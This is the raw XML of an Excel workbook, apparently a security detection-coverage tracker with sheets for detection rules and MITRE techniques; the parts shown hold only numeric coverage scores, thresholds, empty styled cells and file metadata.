        <v>0.66141456582633062</v>
      </c>
      <c r="J8" s="36">
        <v>0.40625</v>
      </c>
      <c r="K8" s="36">
        <v>0.63888888888888884</v>
      </c>
      <c r="L8" s="36">
        <v>0.52941176470588236</v>
      </c>
      <c r="M8" s="36">
        <v>0.47058823529411759</v>
      </c>
      <c r="N8" s="36">
        <v>0.66666666666666663</v>
      </c>
      <c r="O8" s="36">
        <v>0.42857142857142855</v>
      </c>
      <c r="P8" s="36">
        <v>0.64383987025623612</v>
      </c>
    </row>
    <row r="9" spans="1:16" x14ac:dyDescent="0.3">
      <c r="A9" s="7" t="s">
        <v>3353</v>
      </c>
      <c r="B9" s="48">
        <v>1</v>
      </c>
      <c r="C9" s="48">
        <v>0.91</v>
      </c>
      <c r="D9" s="48">
        <v>1</v>
      </c>
      <c r="E9" s="48">
        <v>0.75</v>
      </c>
      <c r="F9" s="48">
        <v>0.54</v>
      </c>
      <c r="G9" s="48">
        <v>0.64</v>
      </c>
      <c r="H9" s="48">
        <v>0.38</v>
      </c>
      <c r="I9" s="48">
        <v>0.66</v>
      </c>
      <c r="J9" s="48">
        <v>0.47</v>
      </c>
      <c r="K9" s="48">
        <v>0.64</v>
      </c>
      <c r="L9" s="48">
        <v>0.53</v>
      </c>
      <c r="M9" s="48">
        <v>0.47</v>
      </c>
      <c r="N9" s="48">
        <v>0.67</v>
      </c>
      <c r="O9" s="48">
        <v>0.43</v>
      </c>
      <c r="P9" s="48">
        <v>0.65</v>
      </c>
    </row>
    <row r="10" spans="1:16" x14ac:dyDescent="0.3">
      <c r="A10" s="7" t="s">
        <v>3354</v>
      </c>
      <c r="B10" s="48">
        <v>1</v>
      </c>
      <c r="C10" s="48">
        <v>0.90773809523809534</v>
      </c>
      <c r="D10" s="48">
        <v>1</v>
      </c>
      <c r="E10" s="48">
        <v>0.75</v>
      </c>
      <c r="F10" s="48">
        <v>0.53556547619047623</v>
      </c>
      <c r="G10" s="48">
        <v>0.64068877551020409</v>
      </c>
      <c r="H10" s="48">
        <v>0.44038732585244217</v>
      </c>
      <c r="I10" s="48">
        <v>0.66141456582633062</v>
      </c>
      <c r="J10" s="48">
        <v>0.5</v>
      </c>
      <c r="K10" s="48">
        <v>0.63888888888888884</v>
      </c>
      <c r="L10" s="48">
        <v>0.52941176470588236</v>
      </c>
      <c r="M10" s="48">
        <v>0.47058823529411759</v>
      </c>
      <c r="N10" s="48">
        <v>0.66666666666666663</v>
      </c>
      <c r="O10" s="48">
        <v>0.42857142857142855</v>
      </c>
      <c r="P10" s="48">
        <v>0.65499437305318087</v>
      </c>
    </row>
    <row r="11" spans="1:16" x14ac:dyDescent="0.3">
      <c r="A11" s="7" t="s">
        <v>3355</v>
      </c>
      <c r="B11" s="36">
        <f>(COVERAGE!B1)</f>
        <v>3.3333333333333333E-2</v>
      </c>
      <c r="C11" s="36">
        <f>(COVERAGE!D1)</f>
        <v>0</v>
      </c>
      <c r="D11" s="36">
        <f>(COVERAGE!F1)</f>
        <v>0</v>
      </c>
      <c r="E11" s="36">
        <f>(COVERAGE!H1)</f>
        <v>6.4935064935064939E-3</v>
      </c>
      <c r="F11" s="36">
        <f>(COVERAGE!J1)</f>
        <v>0</v>
      </c>
      <c r="G11" s="36">
        <f>(COVERAGE!L1)</f>
        <v>0</v>
      </c>
      <c r="H11" s="36">
        <f>(COVERAGE!N1)</f>
        <v>2.6623376623376625E-2</v>
      </c>
      <c r="I11" s="36">
        <f>(COVERAGE!P1)</f>
        <v>1.4705882352941176E-2</v>
      </c>
      <c r="J11" s="36">
        <f>(COVERAGE!R1)</f>
        <v>4.6875E-2</v>
      </c>
      <c r="K11" s="36">
        <f>(COVERAGE!T1)</f>
        <v>0</v>
      </c>
      <c r="L11" s="36">
        <f>(COVERAGE!V1)</f>
        <v>0</v>
      </c>
      <c r="M11" s="36">
        <f>(COVERAGE!X1)</f>
        <v>0</v>
      </c>
      <c r="N11" s="36">
        <f>(COVERAGE!Z1)</f>
        <v>0.1111111111111111</v>
      </c>
      <c r="O11" s="36">
        <f>(COVERAGE!AB1)</f>
        <v>0</v>
      </c>
      <c r="P11" s="36">
        <f>(SUM(B11:O11))/14</f>
        <v>1.7081586422447767E-2</v>
      </c>
    </row>
    <row r="12" spans="1:16" x14ac:dyDescent="0.3">
      <c r="B12" s="36"/>
      <c r="C12" s="36"/>
      <c r="D12" s="36"/>
      <c r="E12" s="36"/>
      <c r="F12" s="36"/>
      <c r="G12" s="36"/>
      <c r="H12" s="36"/>
      <c r="I12" s="36"/>
      <c r="J12" s="36"/>
      <c r="K12" s="36"/>
      <c r="L12" s="36"/>
      <c r="M12" s="36"/>
      <c r="N12" s="36"/>
      <c r="O12" s="36"/>
    </row>
    <row r="13" spans="1:16" x14ac:dyDescent="0.3">
      <c r="B13" s="36"/>
      <c r="C13" s="36"/>
      <c r="D13" s="36"/>
      <c r="E13" s="36"/>
      <c r="F13" s="36"/>
      <c r="G13" s="36"/>
      <c r="H13" s="36"/>
      <c r="I13" s="36"/>
      <c r="J13" s="36"/>
      <c r="K13" s="36"/>
      <c r="L13" s="36"/>
      <c r="M13" s="36"/>
      <c r="N13" s="36"/>
      <c r="O13" s="36"/>
    </row>
    <row r="14" spans="1:16" x14ac:dyDescent="0.3">
      <c r="B14" s="36"/>
      <c r="C14" s="36"/>
      <c r="D14" s="36"/>
      <c r="E14" s="36"/>
      <c r="F14" s="36"/>
      <c r="G14" s="36"/>
      <c r="H14" s="36"/>
      <c r="I14" s="36"/>
      <c r="J14" s="36"/>
      <c r="K14" s="36"/>
      <c r="L14" s="36"/>
      <c r="M14" s="36"/>
      <c r="N14" s="36"/>
      <c r="O14" s="36"/>
    </row>
    <row r="15" spans="1:16" x14ac:dyDescent="0.3">
      <c r="B15" s="36"/>
      <c r="C15" s="36"/>
      <c r="D15" s="36"/>
      <c r="E15" s="36"/>
      <c r="F15" s="36"/>
      <c r="G15" s="36"/>
      <c r="H15" s="36"/>
      <c r="I15" s="36"/>
      <c r="J15" s="36"/>
      <c r="K15" s="36"/>
      <c r="L15" s="36"/>
      <c r="M15" s="36"/>
      <c r="N15" s="36"/>
      <c r="O15" s="36"/>
    </row>
    <row r="16" spans="1:16" x14ac:dyDescent="0.3">
      <c r="B16" s="36"/>
      <c r="C16" s="36"/>
      <c r="D16" s="36"/>
      <c r="E16" s="36"/>
      <c r="F16" s="36"/>
      <c r="G16" s="36"/>
      <c r="H16" s="36"/>
      <c r="I16" s="36"/>
      <c r="J16" s="36"/>
      <c r="K16" s="36"/>
      <c r="L16" s="36"/>
      <c r="M16" s="36"/>
      <c r="N16" s="36"/>
      <c r="O16" s="36"/>
    </row>
    <row r="17" spans="2:17" x14ac:dyDescent="0.3">
      <c r="B17" s="36"/>
      <c r="C17" s="36"/>
      <c r="D17" s="36"/>
      <c r="E17" s="36"/>
      <c r="F17" s="36"/>
      <c r="G17" s="36"/>
      <c r="H17" s="36"/>
      <c r="I17" s="36"/>
      <c r="J17" s="36"/>
      <c r="K17" s="36"/>
      <c r="L17" s="36"/>
      <c r="M17" s="36"/>
      <c r="N17" s="36"/>
      <c r="O17" s="36"/>
    </row>
    <row r="18" spans="2:17" x14ac:dyDescent="0.3">
      <c r="B18" s="36"/>
      <c r="C18" s="36"/>
      <c r="D18" s="36"/>
      <c r="E18" s="36"/>
      <c r="F18" s="36"/>
      <c r="G18" s="36"/>
      <c r="H18" s="36"/>
      <c r="I18" s="36"/>
      <c r="J18" s="36"/>
      <c r="K18" s="36"/>
      <c r="L18" s="36"/>
      <c r="M18" s="36"/>
      <c r="N18" s="36"/>
      <c r="O18" s="36"/>
    </row>
    <row r="19" spans="2:17" x14ac:dyDescent="0.3">
      <c r="B19" s="36"/>
      <c r="C19" s="36"/>
      <c r="D19" s="36"/>
      <c r="E19" s="36"/>
      <c r="F19" s="36"/>
      <c r="G19" s="36"/>
      <c r="H19" s="36"/>
      <c r="I19" s="36"/>
      <c r="J19" s="36"/>
      <c r="K19" s="36"/>
      <c r="L19" s="36"/>
      <c r="M19" s="36"/>
      <c r="N19" s="36"/>
      <c r="O19" s="36"/>
    </row>
    <row r="20" spans="2:17" x14ac:dyDescent="0.3">
      <c r="B20" s="36"/>
      <c r="C20" s="36"/>
      <c r="D20" s="36"/>
      <c r="E20" s="36"/>
      <c r="F20" s="36"/>
      <c r="G20" s="36"/>
      <c r="H20" s="36"/>
      <c r="I20" s="36"/>
      <c r="J20" s="36"/>
      <c r="K20" s="36"/>
      <c r="L20" s="36"/>
      <c r="M20" s="36"/>
      <c r="N20" s="36"/>
      <c r="O20" s="36"/>
    </row>
    <row r="21" spans="2:17" x14ac:dyDescent="0.3">
      <c r="B21" s="36"/>
      <c r="C21" s="36"/>
      <c r="D21" s="36"/>
      <c r="E21" s="36"/>
      <c r="F21" s="36"/>
      <c r="G21" s="36"/>
      <c r="H21" s="36"/>
      <c r="I21" s="36"/>
      <c r="J21" s="36"/>
      <c r="K21" s="36"/>
      <c r="L21" s="36"/>
      <c r="M21" s="36"/>
      <c r="N21" s="36"/>
      <c r="O21" s="36"/>
    </row>
    <row r="22" spans="2:17" x14ac:dyDescent="0.3">
      <c r="B22" s="36"/>
      <c r="C22" s="36"/>
      <c r="D22" s="36"/>
      <c r="E22" s="36"/>
      <c r="F22" s="36"/>
      <c r="G22" s="36"/>
      <c r="H22" s="36"/>
      <c r="I22" s="36"/>
      <c r="J22" s="36"/>
      <c r="K22" s="36"/>
      <c r="L22" s="36"/>
      <c r="M22" s="36"/>
      <c r="N22" s="36"/>
      <c r="O22" s="36"/>
    </row>
    <row r="23" spans="2:17" x14ac:dyDescent="0.3">
      <c r="B23" s="36"/>
      <c r="C23" s="36"/>
      <c r="D23" s="36"/>
      <c r="E23" s="36"/>
      <c r="F23" s="36"/>
      <c r="G23" s="36"/>
      <c r="H23" s="36"/>
      <c r="I23" s="36"/>
      <c r="J23" s="36"/>
      <c r="K23" s="36"/>
      <c r="L23" s="36"/>
      <c r="M23" s="36"/>
      <c r="N23" s="36"/>
      <c r="O23" s="36"/>
    </row>
    <row r="26" spans="2:17" x14ac:dyDescent="0.3">
      <c r="B26" s="36"/>
      <c r="C26" s="36"/>
      <c r="D26" s="36"/>
      <c r="E26" s="36"/>
      <c r="F26" s="36"/>
      <c r="G26" s="36"/>
      <c r="H26" s="36"/>
      <c r="I26" s="36"/>
      <c r="J26" s="36"/>
      <c r="K26" s="36"/>
      <c r="L26" s="36"/>
      <c r="M26" s="36"/>
      <c r="N26" s="36"/>
      <c r="O26" s="36"/>
    </row>
    <row r="27" spans="2:17" x14ac:dyDescent="0.3">
      <c r="B27" s="36"/>
      <c r="C27" s="36"/>
      <c r="D27" s="36"/>
      <c r="E27" s="36"/>
      <c r="F27" s="36"/>
      <c r="G27" s="36"/>
      <c r="H27" s="36"/>
      <c r="I27" s="36"/>
      <c r="J27" s="36"/>
      <c r="K27" s="36"/>
      <c r="L27" s="36"/>
      <c r="M27" s="36"/>
      <c r="N27" s="36"/>
      <c r="O27" s="36"/>
    </row>
    <row r="28" spans="2:17" x14ac:dyDescent="0.3">
      <c r="B28" s="36"/>
      <c r="C28" s="36"/>
      <c r="D28" s="36"/>
      <c r="E28" s="36"/>
      <c r="F28" s="36"/>
      <c r="G28" s="36"/>
      <c r="H28" s="36"/>
      <c r="I28" s="36"/>
      <c r="J28" s="36"/>
      <c r="K28" s="36"/>
      <c r="L28" s="36"/>
      <c r="M28" s="36"/>
      <c r="N28" s="36"/>
      <c r="O28" s="36"/>
      <c r="P28" s="36"/>
      <c r="Q28" s="36"/>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93266-08AA-48DB-AECC-13CA435A5D1D}">
  <dimension ref="A1:O24"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="M12" sqref="M12"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="9.109375" defaultRowHeight="14.4" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="18.109375" bestFit="1" customWidth="1"/>
    <col min="2" max="15" width="13.33203125" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:15" x14ac:dyDescent="0.3">
      <c r="A1" s="7" t="s">
        <v>3356</v>
      </c>
      <c r="B1" s="37" t="s">
        <v>0</v>
      </c>
      <c r="C1" s="37" t="s">
        <v>1</v>
      </c>
      <c r="D1" s="37" t="s">
        <v>2</v>
      </c>
      <c r="E1" s="37" t="s">
        <v>3</v>
      </c>
      <c r="F1" s="37" t="s">
        <v>4</v>
      </c>
      <c r="G1" s="37" t="s">
        <v>5</v>
      </c>
      <c r="H1" s="37" t="s">
        <v>6</v>
      </c>
      <c r="I1" s="37" t="s">
        <v>7</v>
      </c>
      <c r="J1" s="37" t="s">
        <v>8</v>
      </c>
      <c r="K1" s="37" t="s">
        <v>9</v>
      </c>
      <c r="L1" s="37" t="s">
        <v>10</v>
      </c>
      <c r="M1" s="37" t="s">
        <v>11</v>
      </c>
      <c r="N1" s="37" t="s">
        <v>12</v>
      </c>
      <c r="O1" s="37" t="s">
        <v>13</v>
      </c>
    </row>
    <row r="2" spans="1:15" x14ac:dyDescent="0.3">
      <c r="A2" s="41" t="s">
        <v>3357</v>
      </c>
      <c r="B2" s="36">
        <v>0.5</v>
      </c>
      <c r="C2" s="36">
        <v>0.5</v>
      </c>
      <c r="D2" s="36">
        <v>0.5</v>
      </c>
      <c r="E2" s="36">
        <v>0.5</v>
      </c>
      <c r="F2" s="36">
        <v>0.5</v>
      </c>
      <c r="G2" s="36">
        <v>0.5</v>
      </c>
      <c r="H2" s="36">
        <v>0.5</v>
      </c>
      <c r="I2" s="36">
        <v>0.5</v>
      </c>
      <c r="J2" s="36">
        <v>0.5</v>
      </c>
      <c r="K2" s="36">
        <v>0.5</v>
      </c>
      <c r="L2" s="36">
        <v>0.5</v>
      </c>
      <c r="M2" s="36">
        <v>0.5</v>
      </c>
      <c r="N2" s="36">
        <v>0.5</v>
      </c>
      <c r="O2" s="36">
        <v>0.5</v>
      </c>
    </row>
    <row r="3" spans="1:15" x14ac:dyDescent="0.3">
      <c r="A3" s="40" t="s">
        <v>3358</v>
      </c>
      <c r="B3" s="36">
        <v>0.9</v>
      </c>
      <c r="C3" s="36">
        <v>0.9</v>
      </c>
      <c r="D3" s="36">
        <v>0.9</v>
      </c>
      <c r="E3" s="36">
        <v>0.9</v>
      </c>
      <c r="F3" s="36">
        <v>0.9</v>
      </c>
      <c r="G3" s="36">
        <v>0.9</v>
      </c>
      <c r="H3" s="36">
        <v>0.9</v>
      </c>
      <c r="I3" s="36">
        <v>0.9</v>
      </c>
      <c r="J3" s="36">
        <v>0.9</v>
      </c>
      <c r="K3" s="36">
        <v>0.9</v>
      </c>
      <c r="L3" s="36">
        <v>0.9</v>
      </c>
      <c r="M3" s="36">
        <v>0.9</v>
      </c>
      <c r="N3" s="36">
        <v>0.9</v>
      </c>
      <c r="O3" s="36">
        <v>0.9</v>
      </c>
    </row>
    <row r="4" spans="1:15" x14ac:dyDescent="0.3">
      <c r="A4" s="42" t="s">
        <v>3359</v>
      </c>
      <c r="B4" s="36">
        <f>(COVERAGE!B1)</f>
        <v>3.3333333333333333E-2</v>
      </c>
      <c r="C4" s="36">
        <f>(COVERAGE!D1)</f>
        <v>0</v>
      </c>
      <c r="D4" s="36">
        <f>(COVERAGE!F1)</f>
        <v>0</v>
      </c>
      <c r="E4" s="36">
        <f>(COVERAGE!H1)</f>
        <v>6.4935064935064939E-3</v>
      </c>
      <c r="F4" s="36">
        <f>(COVERAGE!J1)</f>
        <v>0</v>
      </c>
      <c r="G4" s="36">
        <f>(COVERAGE!L1)</f>
        <v>0</v>
      </c>
      <c r="H4" s="36">
        <f>(COVERAGE!N1)</f>
        <v>2.6623376623376625E-2</v>
      </c>
      <c r="I4" s="36">
        <f>(COVERAGE!P1)</f>
        <v>1.4705882352941176E-2</v>
      </c>
      <c r="J4" s="36">
        <f>(COVERAGE!R1)</f>
        <v>4.6875E-2</v>
      </c>
      <c r="K4" s="36">
        <f>(COVERAGE!T1)</f>
        <v>0</v>
      </c>
      <c r="L4" s="36">
        <f>(COVERAGE!V1)</f>
        <v>0</v>
      </c>
      <c r="M4" s="36">
        <f>(COVERAGE!X1)</f>
        <v>0</v>
      </c>
      <c r="N4" s="36">
        <f>(COVERAGE!Z1)</f>
        <v>0.1111111111111111</v>
      </c>
      <c r="O4" s="36">
        <f>(COVERAGE!AB1)</f>
        <v>0</v>
      </c>
    </row>
    <row r="5" spans="1:15" x14ac:dyDescent="0.3">
      <c r="B5" s="36"/>
      <c r="C5" s="36"/>
      <c r="D5" s="36"/>
      <c r="E5" s="36"/>
      <c r="F5" s="36"/>
      <c r="G5" s="36"/>
      <c r="H5" s="36"/>
      <c r="I5" s="36"/>
      <c r="J5" s="36"/>
      <c r="K5" s="36"/>
      <c r="L5" s="36"/>
      <c r="M5" s="36"/>
      <c r="N5" s="36"/>
      <c r="O5" s="36"/>
    </row>
    <row r="6" spans="1:15" x14ac:dyDescent="0.3">
      <c r="B6" s="36"/>
      <c r="C6" s="36"/>
      <c r="D6" s="36"/>
      <c r="E6" s="36"/>
      <c r="F6" s="36"/>
      <c r="G6" s="36"/>
      <c r="H6" s="36"/>
      <c r="I6" s="36"/>
      <c r="J6" s="36"/>
      <c r="K6" s="36"/>
      <c r="L6" s="36"/>
      <c r="M6" s="36"/>
      <c r="N6" s="36"/>
      <c r="O6" s="36"/>
    </row>
    <row r="7" spans="1:15" x14ac:dyDescent="0.3">
      <c r="B7" s="36"/>
      <c r="C7" s="36"/>
      <c r="D7" s="36"/>
      <c r="E7" s="36"/>
      <c r="F7" s="36"/>
      <c r="G7" s="36"/>
      <c r="H7" s="36"/>
      <c r="I7" s="36"/>
      <c r="J7" s="36"/>
      <c r="K7" s="36"/>
      <c r="L7" s="36"/>
      <c r="M7" s="36"/>
      <c r="N7" s="36"/>
      <c r="O7" s="36"/>
    </row>
    <row r="8" spans="1:15" x14ac:dyDescent="0.3">
      <c r="B8" s="36"/>
      <c r="C8" s="36"/>
      <c r="D8" s="36"/>
      <c r="E8" s="36"/>
      <c r="F8" s="36"/>
      <c r="G8" s="36"/>
      <c r="H8" s="36"/>
      <c r="I8" s="36"/>
      <c r="J8" s="36"/>
      <c r="K8" s="36"/>
      <c r="L8" s="36"/>
      <c r="M8" s="36"/>
      <c r="N8" s="36"/>
      <c r="O8" s="36"/>
    </row>
    <row r="9" spans="1:15" x14ac:dyDescent="0.3">
      <c r="B9" s="36"/>
      <c r="C9" s="36"/>
      <c r="D9" s="36"/>
      <c r="E9" s="36"/>
      <c r="F9" s="36"/>
      <c r="G9" s="36"/>
      <c r="H9" s="36"/>
      <c r="I9" s="36"/>
      <c r="J9" s="36"/>
      <c r="K9" s="36"/>
      <c r="L9" s="36"/>
      <c r="M9" s="36"/>
      <c r="N9" s="36"/>
      <c r="O9" s="36"/>
    </row>
    <row r="10" spans="1:15" x14ac:dyDescent="0.3">
      <c r="B10" s="36"/>
      <c r="C10" s="36"/>
      <c r="D10" s="36"/>
      <c r="E10" s="36"/>
      <c r="F10" s="36"/>
      <c r="G10" s="36"/>
      <c r="H10" s="36"/>
      <c r="I10" s="36"/>
      <c r="J10" s="36"/>
      <c r="K10" s="36"/>
      <c r="L10" s="36"/>
      <c r="M10" s="36"/>
      <c r="N10" s="36"/>
      <c r="O10" s="36"/>
    </row>
    <row r="11" spans="1:15" x14ac:dyDescent="0.3">
      <c r="B11" s="36"/>
      <c r="C11" s="36"/>
      <c r="D11" s="36"/>
      <c r="E11" s="36"/>
      <c r="F11" s="36"/>
      <c r="G11" s="36"/>
      <c r="H11" s="36"/>
      <c r="I11" s="36"/>
      <c r="J11" s="36"/>
      <c r="K11" s="36"/>
      <c r="L11" s="36"/>
      <c r="M11" s="36"/>
      <c r="N11" s="36"/>
      <c r="O11" s="36"/>
    </row>
    <row r="12" spans="1:15" x14ac:dyDescent="0.3">
      <c r="B12" s="36"/>
      <c r="C12" s="36"/>
      <c r="D12" s="36"/>
      <c r="E12" s="36"/>
      <c r="F12" s="36"/>
      <c r="G12" s="36"/>
      <c r="H12" s="36"/>
      <c r="I12" s="36"/>
      <c r="J12" s="36"/>
      <c r="K12" s="36"/>
      <c r="L12" s="36"/>
      <c r="M12" s="36"/>
      <c r="N12" s="36"/>
      <c r="O12" s="36"/>
    </row>
    <row r="13" spans="1:15" x14ac:dyDescent="0.3">
      <c r="B13" s="36"/>
      <c r="C13" s="36"/>
      <c r="D13" s="36"/>
      <c r="E13" s="36"/>
      <c r="F13" s="36"/>
      <c r="G13" s="36"/>
      <c r="H13" s="36"/>
      <c r="I13" s="36"/>
      <c r="J13" s="36"/>
      <c r="K13" s="36"/>
      <c r="L13" s="36"/>
      <c r="M13" s="36"/>
      <c r="N13" s="36"/>
      <c r="O13" s="36"/>
    </row>
    <row r="14" spans="1:15" x14ac:dyDescent="0.3">
      <c r="B14" s="36"/>
      <c r="C14" s="36"/>
      <c r="D14" s="36"/>
      <c r="E14" s="36"/>
      <c r="F14" s="36"/>
      <c r="G14" s="36"/>
      <c r="H14" s="36"/>
      <c r="I14" s="36"/>
      <c r="J14" s="36"/>
      <c r="K14" s="36"/>
      <c r="L14" s="36"/>
      <c r="M14" s="36"/>
      <c r="N14" s="36"/>
      <c r="O14" s="36"/>
    </row>
    <row r="15" spans="1:15" x14ac:dyDescent="0.3">
      <c r="B15" s="36"/>
      <c r="C15" s="36"/>
      <c r="D15" s="36"/>
      <c r="E15" s="36"/>
      <c r="F15" s="36"/>
      <c r="G15" s="36"/>
      <c r="H15" s="36"/>
      <c r="I15" s="36"/>
      <c r="J15" s="36"/>
      <c r="K15" s="36"/>
      <c r="L15" s="36"/>
      <c r="M15" s="36"/>
      <c r="N15" s="36"/>
      <c r="O15" s="36"/>
    </row>
    <row r="16" spans="1:15" x14ac:dyDescent="0.3">
      <c r="B16" s="36"/>
      <c r="C16" s="36"/>
      <c r="D16" s="36"/>
      <c r="E16" s="36"/>
      <c r="F16" s="36"/>
      <c r="G16" s="36"/>
      <c r="H16" s="36"/>
      <c r="I16" s="36"/>
      <c r="J16" s="36"/>
      <c r="K16" s="36"/>
      <c r="L16" s="36"/>
      <c r="M16" s="36"/>
      <c r="N16" s="36"/>
      <c r="O16" s="36"/>
    </row>
    <row r="17" spans="2:15" x14ac:dyDescent="0.3">
      <c r="B17" s="36"/>
      <c r="C17" s="36"/>
      <c r="D17" s="36"/>
      <c r="E17" s="36"/>
      <c r="F17" s="36"/>
      <c r="G17" s="36"/>
      <c r="H17" s="36"/>
      <c r="I17" s="36"/>
      <c r="J17" s="36"/>
      <c r="K17" s="36"/>
      <c r="L17" s="36"/>
      <c r="M17" s="36"/>
      <c r="N17" s="36"/>
      <c r="O17" s="36"/>
    </row>
    <row r="18" spans="2:15" x14ac:dyDescent="0.3">
      <c r="B18" s="36"/>
      <c r="C18" s="36"/>
      <c r="D18" s="36"/>
      <c r="E18" s="36"/>
      <c r="F18" s="36"/>
      <c r="G18" s="36"/>
      <c r="H18" s="36"/>
      <c r="I18" s="36"/>
      <c r="J18" s="36"/>
      <c r="K18" s="36"/>
      <c r="L18" s="36"/>
      <c r="M18" s="36"/>
      <c r="N18" s="36"/>
      <c r="O18" s="36"/>
    </row>
    <row r="19" spans="2:15" x14ac:dyDescent="0.3">
      <c r="B19" s="36"/>
      <c r="C19" s="36"/>
      <c r="D19" s="36"/>
      <c r="E19" s="36"/>
      <c r="F19" s="36"/>
      <c r="G19" s="36"/>
      <c r="H19" s="36"/>
      <c r="I19" s="36"/>
      <c r="J19" s="36"/>
      <c r="K19" s="36"/>
      <c r="L19" s="36"/>
      <c r="M19" s="36"/>
      <c r="N19" s="36"/>
      <c r="O19" s="36"/>
    </row>
    <row r="20" spans="2:15" x14ac:dyDescent="0.3">
      <c r="B20" s="36"/>
      <c r="C20" s="36"/>
      <c r="D20" s="36"/>
      <c r="E20" s="36"/>
      <c r="F20" s="36"/>
      <c r="G20" s="36"/>
      <c r="H20" s="36"/>
      <c r="I20" s="36"/>
      <c r="J20" s="36"/>
      <c r="K20" s="36"/>
      <c r="L20" s="36"/>
      <c r="M20" s="36"/>
      <c r="N20" s="36"/>
      <c r="O20" s="36"/>
    </row>
    <row r="22" spans="2:15" x14ac:dyDescent="0.3">
      <c r="B22" s="36"/>
      <c r="C22" s="36"/>
      <c r="D22" s="36"/>
      <c r="E22" s="36"/>
      <c r="F22" s="36"/>
      <c r="G22" s="36"/>
      <c r="H22" s="36"/>
      <c r="I22" s="36"/>
      <c r="J22" s="36"/>
      <c r="K22" s="36"/>
      <c r="L22" s="36"/>
      <c r="M22" s="36"/>
      <c r="N22" s="36"/>
      <c r="O22" s="36"/>
    </row>
    <row r="23" spans="2:15" x14ac:dyDescent="0.3">
      <c r="B23" s="36"/>
      <c r="C23" s="36"/>
      <c r="D23" s="36"/>
      <c r="E23" s="36"/>
      <c r="F23" s="36"/>
      <c r="G23" s="36"/>
      <c r="H23" s="36"/>
      <c r="I23" s="36"/>
      <c r="J23" s="36"/>
      <c r="K23" s="36"/>
      <c r="L23" s="36"/>
      <c r="M23" s="36"/>
      <c r="N23" s="36"/>
      <c r="O23" s="36"/>
    </row>
    <row r="24" spans="2:15" x14ac:dyDescent="0.3">
      <c r="B24" s="36"/>
      <c r="C24" s="36"/>
      <c r="D24" s="36"/>
      <c r="E24" s="36"/>
      <c r="F24" s="36"/>
      <c r="G24" s="36"/>
      <c r="H24" s="36"/>
      <c r="I24" s="36"/>
      <c r="J24" s="36"/>
      <c r="K24" s="36"/>
      <c r="L24" s="36"/>
      <c r="M24" s="36"/>
      <c r="N24" s="36"/>
      <c r="O24" s="3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4627A170B691A46995E549C4CCBDF6E" ma:contentTypeVersion="4" ma:contentTypeDescription="Create a new document." ma:contentTypeScope="" ma:versionID="35d7a29a3b7b546bd3ae166d076c2b31">
  <xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:p="http://schemas.microsoft.com/office/2006/metadata/properties" xmlns:ns2="a2a0fe9c-82b5-40a3-895e-658c14a580bf" targetNamespace="http://schemas.microsoft.com/office/2006/metadata/properties" ma:root="true" ma:fieldsID="cc4a7a489d0b35007c0a3cc8b53a2c1d" ns2:_="">
    <xsd:import namespace="a2a0fe9c-82b5-40a3-895e-658c14a580b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a0fe9c-82b5-40a3-895e-658c14a580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F732187-838C-4699-BF02-8419C2C5C876}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/sharepoint/v3/contenttype/forms"/>
  </ds:schemaRefs>
</ds:datastoreItem>
</file>

<file path=customXml/itemProps2.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{EAA8A9B0-84CB-42D4-A832-BC0E65F593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2a0fe9c-82b5-40a3-895e-658c14a580b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9845F22-ECED-4DD6-B83F-A1B3B4FF5523}">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COVERAGE</vt:lpstr>
      <vt:lpstr>Detection Rules</vt:lpstr>
      <vt:lpstr>Mitre Techniques</vt:lpstr>
      <vt:lpstr>Data Sources</vt:lpstr>
      <vt:lpstr>legends</vt:lpstr>
      <vt:lpstr>Basic Progress</vt:lpstr>
      <vt:lpstr>Advanced Progress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Rohit  Rana</cp:lastModifiedBy>
  <cp:revision/>
  <dcterms:created xsi:type="dcterms:W3CDTF">2024-03-22T23:09:25Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-12-24T10:50:58Z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0x01010024627A170B691A46995E549C4CCBDF6E</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xd_Signature">
    <vt:bool>false</vt:bool>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="9" name="MediaServiceImageTags">
    <vt:lpwstr/>
  </property>
</Properties>
</file>